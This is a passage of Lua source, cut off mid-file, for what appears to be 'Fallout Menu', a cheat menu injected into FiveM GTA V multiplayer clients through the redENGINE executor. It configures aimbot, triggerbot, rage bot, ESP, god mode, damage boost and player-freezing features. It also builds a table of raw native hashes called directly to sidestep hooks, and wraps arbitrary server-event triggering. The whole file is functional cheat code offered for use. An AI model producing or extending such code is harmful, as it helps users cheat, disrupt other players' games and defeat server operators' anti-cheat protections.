
     CreateThread(function()

        local camX, camY, camZ
   
        local lift_height = 0.0
   
        local lift_inc = 0.1
   
        local branding = {}
   
        local rc_camX, rc_camY, rc_camZ, rc_camSX, rc_camSY = 0.0, 0.0, 0.0, 80.0, 0.0
   
        local resource_list = {}
   
        local resource_data = {}
   
    
   
        local dict = {
   
            Citizen = Citizen,
   
            math = math,
   
            string = string,
   
            debug = debug,
   
            type = type,
   
            tostring = tostring,
   
            tonumber = tonumber,
   
            json = json,
   
            utf8 = utf8,
   
            table = table,
   
            pairs = pairs,
   
            ipairs = ipairs,
   
            color_white = {255, 255, 255, 255},
   
            color_black = {0, 0, 0, 255},
   
            color_friend = {55, 200, 55},
   
            color_dead = {200, 55, 55},
   
            ESX = nil,
   
            binding = nil,
   
            vector_origin = vector3(0, 0, 0),
   
            binds = {},
   
            bind_handler = {},
   
            bind_time = 0
   
        }
   
    
   
        dict.bone_check = {{31086, "SKEL_HEAD"}, {0, "SKEL_ROOT"}, {22711, "SKEL_L_Forearm"}, {28252, "SKEL_R_Forearm"}, {45509, "SKEL_L_UpperArm"}, {40269, "SKEL_R_UpperArm"}, {58271, "SKEL_L_Thigh"}, {51826, "SKEL_R_Thigh"}, {24816, "SKEL_Spine1"}, {24817, "SKEL_Spine2"}, {24818, "SKEL_Spine3"}, {14201, "SKEL_L_Foot"}, {52301, "SKEL_R_Foot"}}
   
        dict.aimbot_bones = {"SKEL_HEAD", "SKEL_ROOT", "SKEL_L_Forearm", "SKEL_R_Forearm", "SKEL_L_UpperArm", "SKEL_R_UpperArm", "SKEL_L_Thigh", "SKEL_R_Thigh", "SKEL_Spine1", "SKEL_Spine2", "SKEL_Spine3", "SKEL_L_Foot", "SKEL_R_Foot"}
   
        dict.friends = {}
   
        dict.frozen_ents = {}
   
        dict.frozen_players = {}
   
        dict.blacklisted_users = {}
   
        dict.notifications_h = 64
   
        dict.spectating_fov = -5.0
   
        dict.moving_wp = false
   
        dict.spike_ents = {}
   
    
   
        local function _Get_Executor()
   
            local redENGINE = (rE or {}).ConfigHandler
   
            if dict.type(redENGINE) == "function" then return "redENGINE" end
   
    
   
            return "None"
   
        end
   
    
   
        local _Executor_Strings = {
   
            ["redENGINE"] = "~r~redENGINE~s~",
   
            ["None"] = "~b~Resource~s~"
   
        }
   
    
   
        local _Executor = _Get_Executor()
   
        dict.Citizen.IN = dict.Citizen.InvokeNative
   
    
   
        local AREF = {
   
            DynamicTriggers = {},
   
            Painter = {},
   
            Util = {},
   
            Categories = {},
   
            List = {},
   
            PlayerCache = {},
   
            Config = {
   
                Binds = {},
   
                Vehicle = {
   
                    GodMode = false,
   
                    BulletProofTires = false,
   
                    Boost = 1.0,
   
                    Wallride = false
   
                },
   
                Weapon = {
   
                    DamageBoost = 1.0
   
                },
   
                Player = {
   
                    CrossHair = false,
   
                    Blips = true,
   
                    ESP = true,
   
                    Names = true,
   
                    ESPDistance = 1000.0,
   
                    Box = false,
   
                    Bone = false,
   
                    OneTap = false,
   
                    Aimbot = false,
   
                    AimbotNeedsLOS = true,
   
                    TriggerBotNeedsLOS = true,
   
                    TPAimbot = false,
   
                    TPAimbotThreshold = 40.0,
   
                    TPAimbotDistance = 2.0,
   
                    RageBot = false,
   
                    TriggerBot = false,
   
                    NoDrop = false,
   
                    AimbotFOV = 90.0,
   
                    AimbotBone = 1,
   
                    AimbotKey = "MOUSE1",
   
                    AimbotReleaseKey = "LEFTALT",
   
                    TriggerBotDistance = 500.0,
   
                    TargetInsideVehicles = false
   
                },
   
                UseBackgroundImage = true,
   
                UseSounds = true,
   
                UseAutoWalk = false,
   
                UseAutoWalkAlt = false,
   
                ShowKey = "TAB",
   
                FreeCamKey = "HOME",
   
                RCCamKey = "=",
   
                DisableKey = "-",
   
                ShowText = true,
   
                ShowNotifications = true,
   
                SafeMode = true,
   
                MenuX = 300,
   
                MenuY = 300,
   
                NotifX = nil,
   
                NotifY = nil,
   
                NotifW = 420,
   
                CurrentSelection = 1,
   
                SelectedCategory = "category_1",
   
                UsePrintMessages = false,
   
                DisableMovement = true,
   
                Tertiary = {255, 205, 0, 255}
   
            },
   
            Name = "Fallout Menu",
   
            Build = "1.2.8a",
   
            FileKey = "2afb96af2fd85a604b061665868e41ff",
   
            Enabled = true,
   
            Showing = false,
   
            Base64 = {},
   
            MenuW = 923,
   
            MenuH = 583,
   
            _MouseX = 0,
   
            _MouseY = 0,
   
            DraggingX = nil,
   
            DraggingY = nil,
   
            CurrentPlayer = nil
   
        }
   
    
   
        local known_returns = {
   
            ["That file doesn't exist."] = true,
   
            ["Error opening file."] = true,
   
            ["Tried to save but data was null."] = true,
   
            ["Error deleting config. It doesn't exist."] = true,
   
            ["Successfully saved config."] = true,
   
            ["Successfully deleted config."] = true
   
        }
   
    
   
        local current_config = "fm_default"
   
    
   
        local function _count(tab)
   
            local c = 0
   
    
   
            for _ in dict.pairs(tab) do
   
                c = c + 1
   
            end
   
    
   
            return c
   
        end
   
    
   
        function AREF:DumpTable(tab, done, ind)
   
            if not tab then return end
   
    
   
            if not done then
   
                done = {}
   
            end
   
    
   
            if not ind then
   
                ind = 0
   
            end
   
    
   
            if done[tab] then return end
   
    
   
            for key, val in dict.pairs(tab) do
   
                print(string.rep("	", ind) .. "[" .. dict.tostring(key) .. "] = " .. dict.tostring(val))
   
    
   
                if dict.type(val) == "table" then
   
                    local cum = ind + 1
   
                    self:DumpTable(val, done, cum)
   
                    done[val] = true
   
                end
   
            end
   
        end
   
    
   
        AREF.Base64.CharList = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
   
    
   
        function AREF.Base64:Encode(data)
   
            return (data:gsub(".", function(x)
   
                local r, b = "", x:byte()
   
    
   
                for i = 8, 1, -1 do
   
                    r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and '1' or '0')
   
                end
   
    
   
                return r
   
            end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)
   
                if (#x < 6) then return '' end
   
                local c = 0
   
    
   
                for i = 1, 6 do
   
                    c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0)
   
                end
   
    
   
                return self.CharList:sub(c + 1, c + 1)
   
            end) .. ({'', '==', '='})[#data % 3 + 1]
   
        end
   
    
   
        function AREF:SetConfigList()
   
            if _Executor ~= "redENGINE" then return end
   
            rE.ConfigHandler("save", "fallout/list.json", dict.json.encode(self.List), self.FileKey)
   
        end
   
    
   
        function AREF:BuildIdentifier()
   
            if _Executor ~= "redENGINE" then return end
   
            local out = rE.ConfigHandler("load", "fallout/identifier.json", "", self.FileKey)
   
    
   
            if out == "That file doesn't exist." or out == "Error opening file." then
   
                local identifier = self.Base64:Encode("Name=" .. self:GetFunction("GetPlayerName")(self.NetworkID) .. ":Res=" .. self:GetFunction("GetActiveScreenResolution")() .. ":" .. "Time=" .. self:GetFunction("GetGameTimer")())
   
                rE.ConfigHandler("save", "fallout/identifier.json", identifier, self.FileKey)
   
                self.Identifier = identifier
   
    
   
                return
   
            end
   
    
   
            self.Identifier = out
   
        end
   
    
   
        function AREF:GetConfigList()
   
            if _Executor ~= "redENGINE" then return {} end
   
            local out = rE.ConfigHandler("load", "fallout/list.json", "", self.FileKey)
   
    
   
            if out == "That file doesn't exist." or out == "Error opening file." then
   
                self.List = {
   
                    [current_config] = 1
   
                }
   
    
   
                self:SetConfigList()
   
    
   
                return {}
   
            end
   
    
   
            if known_returns[out] then
   
                self:AddNotification("Failed to fetch configs. See console for details.")
   
                self:Print("[CONFIG] Failed to load config list: ^1" .. out .. "^7")
   
    
   
                return {}
   
            else
   
                return dict.json.decode(out) or {}
   
            end
   
        end
   
    
   
        function AREF:CopyTable(tab)
   
            local out = {}
   
            if type(tab) ~= "table" then return out end
   
    
   
            for key, val in dict.pairs(tab) do
   
                if dict.type(val) == "table" then
   
                    out[key] = self:CopyTable(val)
   
                else
   
                    out[key] = val
   
                end
   
            end
   
    
   
            return out
   
        end
   
    
   
        function AREF:IsFriend(ped)
   
            local id = self:GetFunction("NetworkGetPlayerIndexFromPed")(ped)
   
            if not id or id < 0 then return false end
   
    
   
            return dict.friends[self:GetFunction("GetPlayerServerId")(id)]
   
        end
   
    
   
        AREF.DefaultConfig = AREF:CopyTable(AREF.Config)
   
        AREF.List = AREF:GetConfigList()
   
    
   
        AREF.ConfigClass = {
   
            Load = function(cfg)
   
                if _Executor ~= "redENGINE" then return AREF:AddNotification("INFO", "Your build (" .. _Executor_Strings[_Executor] .. ") does not support custom configs.", 15000) end
   
                local out = rE.ConfigHandler("load", "fallout/" .. (cfg or current_config) .. ".json", "", AREF.FileKey)
   
    
   
                if out == "That file doesn't exist." or out == "Error opening file." and (cfg or current_config) == "fm_default" then
   
                    AREF:AddNotification("INFO", "Creating config for the first time.")
   
    
   
                    return AREF.ConfigClass.Save(true)
   
                end
   
    
   
                if known_returns[out] then
   
                    AREF:Print("[CONFIG] Failed to load ^3" .. (cfg or current_config) .. "^7: ^1" .. out .. "^7")
   
    
   
                    return AREF:AddNotification("ERROR", "Failed to load config. See console for details.")
   
                else
   
                    local _config = dict.json.decode(out)
   
    
   
                    if dict.type(_config) == "table" then
   
                        AREF.Config = _config
   
                        AREF.Config.SafeMode = true
   
                        AREF.Config.Player.ThermalVision = false
   
                        AREF.Config.Player.NoClip = false
   
                        AREF.Config.Player.OneTap = false
   
                        AREF.Config.Player.God = false
   
                        AREF.Config.Player.MagicCarpet = false
   
                        AREF.Config.Player.FakeDead = false
   
                        AREF.Config.Weapon.DamageBoost = 1.0
   
                        AREF.Config.Weapon.InfiniteAmmo = false
   
                        AREF.Config.Player.SuperJump = false
   
                        AREF.Config.Player.SuperRun = false
   
                        AREF.ConfigClass.DoSanityCheck()
   
                        AREF:AddNotification("SUCCESS", "Config loaded.")
   
                        AREF:Print("[CONFIG] Loaded config ^3" .. (cfg or current_config) .. "^7.")
   
                    else
   
                        AREF.ConfigClass.Save(true)
   
                        AREF:Print("[CONFIG] Failed to save ^3" .. (cfg or current_config) .. "^7: ^1Invalid data.^7")
   
    
   
                        return AREF:AddNotification("ERROR", "Failed to load config. See console for details.")
   
                    end
   
                end
   
            end,
   
            DoSanityCheck = function()
   
                for key, val in dict.pairs(AREF.DefaultConfig) do
   
                    if type(AREF.Config[key]) ~= type(val) then
   
                        AREF.Config[key] = val
   
                    end
   
    
   
                    if dict.type(val) == "table" then
   
                        if _count(val) > 0 then
   
                            for k2, v2 in dict.pairs(val) do
   
                                if type(AREF.Config[key][k2]) ~= type(v2) then
   
                                    AREF.Config[key][k2] = v2
   
                                end
   
                            end
   
                        elseif type(AREF.Config[key]) ~= "table" then
   
                            AREF.Config[key] = val
   
                        end
   
                    end
   
                end
   
            end,
   
            Delete = function(name)
   
                if _Executor ~= "redENGINE" then return end
   
                local out = rE.ConfigHandler("delete", "fallout/" .. name .. ".json", AREF.FileKey)
   
    
   
                if out ~= "Successfully deleted config." then
   
                    AREF:AddNotification("ERROR", "Failed to delete config. See console for details.")
   
    
   
                    return AREF:Print("[CONFIG] Failed to delete ^3" .. name .. "^7: ^1" .. out .. "^7")
   
                end
   
            end,
   
            Rename = function(old, new)
   
                if _Executor ~= "redENGINE" then return end
   
                local existing = rE.ConfigHandler("load", "fallout/" .. old .. ".json", "", AREF.FileKey)
   
    
   
                if existing == "Error opening file." or existing == "That file doesn't exist." then
   
                    AREF:AddNotification("ERROR", "Failed to rename config. See console for details.")
   
    
   
                    return AREF:Print("[CONFIG] Failed to rename ^3" .. old .. " to ^3" .. new .. "^7: ^1" .. existing .. "^7")
   
                end
   
            end,
   
            Exists = function(name)
   
                if _Executor ~= "redENGINE" then return end
   
                local existing = rE.ConfigHandler("load", "fallout/" .. name .. ".json", "", AREF.FileKey)
   
    
   
                if existing == "Error opening file." or existing == "That file doesn't exist." then
   
                    AREF:AddNotification("ERROR", "Failed to rename config. See console for details.")
   
    
   
                    return false
   
                end
   
    
   
                return true
   
            end,
   
            Write = function(name, cfg)
   
                if _Executor ~= "redENGINE" then return end
   
                cfg = AREF:CopyTable(cfg)
   
                cfg.Player.AimbotTarget = nil
   
                cfg.SafeMode = nil
   
                cfg = dict.json.encode(cfg)
   
                local out = rE.ConfigHandler("save", "fallout/" .. name .. ".json", cfg, AREF.FileKey)
   
    
   
                if known_returns[out] and not silent then
   
                    local good = out:find("Successfully")
   
    
   
                    if not good then
   
                        AREF:Print("[CONFIG] Failed to save ^3" .. current_config .. "^7: ^1" .. out .. "^7")
   
    
   
                        return AREF:AddNotification("ERROR", "Failed to save config. See console for details.")
   
                    elseif silent == false then
   
                        AREF:Print("[CONFIG] Saved config ^3" .. current_config .. "^7.")
   
                    end
   
                end
   
            end,
   
            Save = function(silent)
   
                if _Executor ~= "redENGINE" then return end
   
                local config = AREF:CopyTable(AREF.Config)
   
                config.Player.AimbotTarget = nil
   
                config.SafeMode = nil
   
                config = dict.json.encode(config)
   
                local out = rE.ConfigHandler("save", "fallout/" .. current_config .. ".json", config, AREF.FileKey)
   
                AREF.List[current_config] = AREF.List[current_config] or (_count(AREF.List) + 1)
   
    
   
                if known_returns[out] and not silent then
   
                    local good = out:find("Successfully")
   
    
   
                    if not good then
   
                        AREF:Print("[CONFIG] Failed to save ^3" .. current_config .. "^7: ^1" .. out .. "^7")
   
    
   
                        return AREF:AddNotification("ERROR", "Failed to save config. See console for details.")
   
                    elseif silent == false then
   
                        AREF:Print("[CONFIG] Saved config ^3" .. current_config .. "^7.")
   
                    end
   
                end
   
            end
   
        }
   
    
   
        local function _unpack(add)
   
            local out = {}
   
    
   
            for key, val in dict.pairs(_G) do
   
                out[key] = val
   
            end
   
    
   
            for key, val in dict.pairs(add) do
   
                out[key] = val
   
            end
   
    
   
            return out
   
        end
   
    
   
        local boundaryIdx = 1
   
    
   
        local function dummyUseBoundary(idx)
   
            return nil
   
        end
   
    
   
        local function getBoundaryFunc(bfn, bid)
   
            return function(fn, ...)
   
                local boundary = bid or (boundaryIdx + 1)
   
                boundaryIdx = boundaryIdx + 1
   
                bfn(boundary, coroutine.running())
   
    
   
                local wrap = function(...)
   
                    dummyUseBoundary(boundary)
   
                    local v = dict.table.pack(fn(...))
   
    
   
                    return dict.table.unpack(v)
   
                end
   
    
   
                local v = dict.table.pack(wrap(...))
   
                bfn(boundary, nil)
   
    
   
                return dict.table.unpack(v)
   
            end
   
        end
   
    
   
        local runWithBoundaryEnd = getBoundaryFunc(dict.Citizen.SubmitBoundaryEnd)
   
    
   
        local function lookupify(t)
   
            local r = {}
   
    
   
            for _, v in dict.ipairs(t) do
   
                r[v] = true
   
            end
   
    
   
            return r
   
        end
   
    
   
        local blocked_ranges = {{0x0001F601, 0x0001F64F}, {0x00002702, 0x000027B0}, {0x0001F680, 0x0001F6C0}, {0x000024C2, 0x0001F251}, {0x0001F300, 0x0001F5FF}, {0x00002194, 0x00002199}, {0x000023E9, 0x000023F3}, {0x000025FB, 0x000026FD}, {0x0001F300, 0x0001F5FF}, {0x0001F600, 0x0001F636}, {0x0001F681, 0x0001F6C5}, {0x0001F30D, 0x0001F567}, {0x0001F980, 0x0001F984}, {0x0001F910, 0x0001F918}, {0x0001F6E0, 0x0001F6E5}, {0x0001F920, 0x0001F927}, {0x0001F919, 0x0001F91E}, {0x0001F933, 0x0001F93A}, {0x0001F93C, 0x0001F93E}, {0x0001F985, 0x0001F98F}, {0x0001F940, 0x0001F94F}, {0x0001F950, 0x0001F95F}, {0x0001F928, 0x0001F92F}, {0x0001F9D0, 0x0001F9DF}, {0x0001F9E0, 0x0001F9E6}, {0x0001F992, 0x0001F997}, {0x0001F960, 0x0001F96B}, {0x0001F9B0, 0x0001F9B9}, {0x0001F97C, 0x0001F97F}, {0x0001F9F0, 0x0001F9FF}, {0x0001F9E7, 0x0001F9EF}, {0x0001F7E0, 0x0001F7EB}, {0x0001FA90, 0x0001FA95}, {0x0001F9A5, 0x0001F9AA}, {0x0001F9BA, 0x0001F9BF}, {0x0001F9C3, 0x0001F9CA}, {0x0001FA70, 0x0001FA73}}
   
        local block_singles = lookupify{0x000000A9, 0x000000AE, 0x0000203C, 0x00002049, 0x000020E3, 0x00002122, 0x00002139, 0x000021A9, 0x000021AA, 0x0000231A, 0x0000231B, 0x000025AA, 0x000025AB, 0x000025B6, 0x000025C0, 0x00002934, 0x00002935, 0x00002B05, 0x00002B06, 0x00002B07, 0x00002B1B, 0x00002B1C, 0x00002B50, 0x00002B55, 0x00003030, 0x0000303D, 0x00003297, 0x00003299, 0x0001F004, 0x0001F0CF, 0x0001F6F3, 0x0001F6F4, 0x0001F6E9, 0x0001F6F0, 0x0001F6CE, 0x0001F6CD, 0x0001F6CF, 0x0001F6CB, 0x00023F8, 0x00023F9, 0x00023FA, 0x0000023, 0x0001F51F, 0x0001F6CC, 0x0001F9C0, 0x0001F6EB, 0x0001F6EC, 0x0001F6D0, 0x00023CF, 0x000002A, 0x0002328, 0x0001F5A4, 0x0001F471, 0x0001F64D, 0x0001F64E, 0x0001F645, 0x0001F646, 0x0001F681, 0x0001F64B, 0x0001F647, 0x0001F46E, 0x0001F575, 0x0001F582, 0x0001F477, 0x0001F473, 0x0001F930, 0x0001F486, 0x0001F487, 0x0001F6B6, 0x0001F3C3, 0x0001F57A, 0x0001F46F, 0x0001F3CC, 0x0001F3C4, 0x0001F6A3, 0x0001F3CA, 0x00026F9, 0x0001F3CB, 0x0001F6B5, 0x0001F6B5, 0x0001F468, 0x0001F469, 0x0001F990, 0x0001F991, 0x0001F6F5, 0x0001F6F4, 0x0001F6D1, 0x0001F6F6, 0x0001F6D2, 0x0002640, 0x0002642, 0x0002695, 0x0001F3F3, 0x0001F1FA, 0x0001F91F, 0x0001F932, 0x0001F931, 0x0001F9F8, 0x0001F9F7, 0x0001F3F4, 0x0001F970, 0x0001F973, 0x0001F974, 0x0001F97A, 0x0001F975, 0x0001F976, 0x0001F9B5, 0x0001F9B6, 0x0001F468, 0x0001F469, 0x0001F99D, 0x0001F999, 0x0001F99B, 0x0001F998, 0x0001F9A1, 0x0001F99A, 0x0001F99C, 0x0001F9A2, 0x0001F9A0, 0x0001F99F, 0x0001F96D, 0x0001F96C, 0x0001F96F, 0x0001F9C2, 0x0001F96E, 0x0001F99E, 0x0001F9C1, 0x0001F6F9, 0x0001F94E, 0x0001F94F, 0x0001F94D, 0x0000265F, 0x0000267E, 0x0001F3F4, 0x0001F971, 0x0001F90E, 0x0001F90D, 0x0001F90F, 0x0001F9CF, 0x0001F9CD, 0x0001F9CE, 0x0001F468, 0x0001F469, 0x0001F9D1, 0x0001F91D, 0x0001F46D, 0x0001F46B, 0x0001F46C, 0x0001F9AE, 0x0001F415, 0x0001F6D5, 0x0001F6FA, 0x0001FA82, 0x0001F93F, 0x0001FA80, 0x0001FA81, 0x0001F97B, 0x0001F9AF, 0x0001FA78, 0x0001FA79, 0x0001FA7A}
   
    
   
        function AREF:RemoveEmojis(str)
   
            local new = ""
   
    
   
            for _, codepoint in dict.utf8.codes(str) do
   
                local safe = true
   
    
   
                if block_singles[codepoint] then
   
                    safe = false
   
                else
   
                    for _, range in dict.ipairs(blocked_ranges) do
   
                        if range[1] <= codepoint and codepoint <= range[2] then
   
                            safe = false
   
                            break
   
                        end
   
                    end
   
                end
   
    
   
                if safe then
   
                    new = new .. dict.utf8.char(codepoint)
   
                end
   
            end
   
    
   
            return new
   
        end
   
    
   
        -- Used to clean player names.
   
        function AREF:CleanName(str, is_esp)
   
            str = str:gsub("~", "")
   
            str = self:RemoveEmojis(str)
   
    
   
            if #str >= 25 and not is_esp then
   
                str = str:sub(1, 25) .. "..."
   
            end
   
    
   
            return str
   
        end
   
    
   
        local _natives = {
   
            ["TriggerEvent"] = {
   
                func = function(eventName, ...)
   
                    if not eventName then return end
   
                    local payload = msgpack.pack({...})
   
    
   
                    return runWithBoundaryEnd(function() return TriggerEventInternal(eventName, payload, payload:len()) end)
   
                end
   
            },
   
            ["TriggerServerEvent"] = {
   
                func = function(eventName, ...)
   
                    if not eventName then return end
   
                    local payload = msgpack.pack({...})
   
    
   
                    return TriggerServerEventInternal(eventName, payload, payload:len())
   
                end
   
            },
   
            ["DestroyCam"] = {
   
                hash = 0x865908C81A2C22E9
   
            },
   
            ["IsVehicleTyreBurst"] = {
   
                hash = 0x48C80210,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], args[2], args[3], Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger()
   
                end,
   
                return_as = function(int) return int == 1 end
   
            },
   
            ["IsPauseMenuActive"] = {
   
                hash = 0xB0034A223497FFCB,
   
                unpack = function(...) return Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger() end,
   
                return_as = function(int) return int == 1 end
   
            },
   
            ["CreateRuntimeTxd"] = {
   
                hash = 0x1F3AC778,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], Citizen.ReturnResultAnyway(), Citizen.ResultAsLong()
   
                end
   
            },
   
            ["CreateDui"] = {
   
                hash = 0x23EAF899,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.tostring(args[1]), args[2], args[3], Citizen.ReturnResultAnyway(), Citizen.ResultAsLong()
   
                end
   
            },
   
            ["GetDuiHandle"] = {
   
                hash = 0x1655D41D,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], Citizen.ReturnResultAnyway(), Citizen.ResultAsString()
   
                end
   
            },
   
            ["CreateRuntimeTextureFromDuiHandle"] = {
   
                hash = 0xB135472B,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.tostring(args[2]), dict.tostring(args[3]), Citizen.ReturnResultAnyway(), Citizen.ResultAsLong()
   
                end
   
            },
   
            ["DestroyDui"] = {
   
                hash = 0xA085CB10,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1]
   
                end
   
            },
   
            ["GetCurrentServerEndpoint"] = {
   
                hash = 0xEA11BFBA,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ResultAsString()
   
                end
   
            },
   
            ["GetCurrentResourceName"] = {
   
                hash = 0xE5E9EBBB,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ResultAsString()
   
                end
   
            },
   
            ["GetGameTimer"] = {
   
                hash = 0x9CD27B0045628463,
   
                unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
   
            },
   
            ["GetActivePlayers"] = {
   
                hash = 0xcf143fb9,
   
                unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsObject() end,
   
                return_as = function(obj) return msgpack.unpack(obj) end
   
            },
   
            ["GetVehicleNumberOfWheels"] = {
   
                hash = 0xEDF4B0FC,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["ExecuteCommand"] = {
   
                hash = 0x561C060B
   
            },
   
            ["GetVehicleNeonLightsColour"] = {
   
                hash = 0x7619EEE8C886757F,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueInt()
   
                end
   
            },
   
            ["GetVehicleCustomPrimaryColour"] = {
   
                hash = 0xB64CF2CCA9D95F52,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueInt(), dict.Citizen.PointerValueInt()
   
                end
   
            },
   
            ["SetVehicleGravityAmount"] = {
   
                hash = 0x1A963E58
   
            },
   
            ["SetVehicleSteeringScale"] = {
   
                hash = 0xEB46596F
   
            },
   
            ["SetVehicleNeonLightsColour"] = {
   
                hash = 0x8E0A582209A62695
   
            },
   
            ["SetVehicleCustomPrimaryColour"] = {
   
                hash = 0x7141766F91D15BEA
   
            },
   
            ["SetVehicleCustomSecondaryColour"] = {
   
                hash = 0x36CED73BFED89754
   
            },
   
            ["SetVehicleSteerBias"] = {
   
                hash = 0x42A8EC77D5150CBE
   
            },
   
            ["SetSeethrough"] = {
   
                hash = 0x7E08924259E08CE0
   
            },
   
            ["SetVehicleOnGroundProperly"] = {
   
                hash = 0x49733E92263139D1
   
            },
   
            ["SetVehicleTyreBurst"] = {
   
                hash = 0xEC6A202EE4960385
   
            },
   
            ["SetVehicleLights"] = {
   
                hash = 0x34E710FF01247C5A
   
            },
   
            ["SetVehicleLightsMode"] = {
   
                hash = 0x1FD09E7390A74D54
   
            },
   
            ["SetVehicleEngineTemperature"] = {
   
                hash = 0x6C93C4A9
   
            },
   
            ["SetVehicleEngineCanDegrade"] = {
   
                hash = 0x983765856F2564F9
   
            },
   
            ["ModifyVehicleTopSpeed"] = {
   
                hash = 0x93A3996368C94158
   
            },
   
            ["SetVehicleWheelSize"] = {
   
                hash = 0x53AB5C35
   
            },
   
            ["SetVehicleWheelTireColliderSize"] = {
   
                hash = 0xB962D05C
   
            },
   
            ["GetVehicleMaxNumberOfPassengers"] = {
   
                hash = 0xA7C4F2C6E744A550,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["FindFirstVehicle"] = {
   
                hash = 0x15e55694,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.Citizen.PointerValueIntInitialized(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["FindNextVehicle"] = {
   
                hash = 0x8839120d,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["EndFindVehicle"] = {
   
                hash = 0x9227415a,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1]
   
                end
   
            },
   
            ["FindFirstPed"] = {
   
                hash = 0xfb012961,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.Citizen.PointerValueIntInitialized(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["FindNextPed"] = {
   
                hash = 0xab09b548,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["EndFindPed"] = {
   
                hash = 0x9615c2ad,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1]
   
                end
   
            },
   
            ["FindFirstObject"] = {
   
                hash = 0xFAA6CB5D,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.Citizen.PointerValueIntInitialized(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["FindNextObject"] = {
   
                hash = 0x4E129DBF,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.PointerValueIntInitialized(args[2]), dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["EndFindObject"] = {
   
                hash = 0xDEDA4E50,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1]
   
                end
   
            },
   
            ["GetPlayerServerId"] = {
   
                hash = 0x4D97BCC7,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetNumResources"] = {
   
                hash = 0x863F27B,
   
                unpack = function() return dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger() end
   
            },
   
            ["GetResourceState"] = {
   
                hash = 0x4039B485,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.tostring(args[1]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
   
                end
   
            },
   
            ["GetNumResourceMetadata"] = {
   
                hash = 0x776E864,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.tostring(args[1]), dict.tostring(args[2]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsInteger()
   
                end
   
            },
   
            ["GetResourceMetadata"] = {
   
                hash = 0x964BAB1D,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return dict.tostring(args[1]), dict.tostring(args[2]), args[3], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
   
                end
   
            },
   
            ["GetResourceByFindIndex"] = {
   
                hash = 0x387246b7,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
                    return args[1], dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString()
   
                end
   
            },
   
            -- This stupid fucking function always gives issues
   
            ["LoadResourceFile"] = {
   
                func = function(...)
   
                    local args = {...}
   
    
   
                    return dict.Citizen.IN(0x76a9ee1f, dict.tostring(args[1]), dict.tostring(args[2]), dict.Citizen.ReturnResultAnyway(), dict.Citizen.ResultAsString())
   
                end
   
            },
   
            ["RequestCollisionAtCoord"] = {
   
                hash = 0x07503F7948F491A7,
   
                unpack = function(...)
   
                    local args = (...)
   
                    local x, y, z
   
    
   
                    if dict.type(args[1]) == "table" or dict.type(args[1]) == "vector" then
   
                        x = args[1].x
   
                        y = args[1].y
   
                        z = args[1].z
   
                    else
   
                        x = args[1]
   
                        y = args[2]
   
                        z = args[3]
   
                    end
   
    
   
                    return x, y, z, dict.Citizen.ReturnResultAnyway()
   
                end
   
            },
   
            ["GetEntityCoords"] = {
   
                hash = 0x3FEF770D40960D5A,
   
                unpack = function(...)
   
                    local args = (...)
   
    
   
